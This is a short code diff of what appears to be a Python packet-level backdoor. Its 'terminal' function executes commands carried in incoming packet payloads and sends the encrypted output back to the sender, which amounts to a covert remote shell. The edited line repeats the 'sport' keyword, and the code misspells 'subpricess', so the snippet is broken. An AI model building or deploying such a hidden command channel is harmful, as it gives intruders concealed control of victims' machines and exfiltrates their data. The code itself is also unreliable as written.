@@ -397,7 +397,7 @@ def getFile(packet):
 def terminal(packet):
 	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
 	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
-	                TCP(sport=random.randint(0, 65535), dport=packet[TCP].src, seq=packet[TCP].seq+1)/\
+	                TCP(sport=random.randint(0, 65535), sport=packet[TCP].dport, seq=packet[TCP].seq+1)/\
 	                RAW(load=encrypt(output))
 	send(confirmPacket, verbose=0)
 	if len(log) > 0:
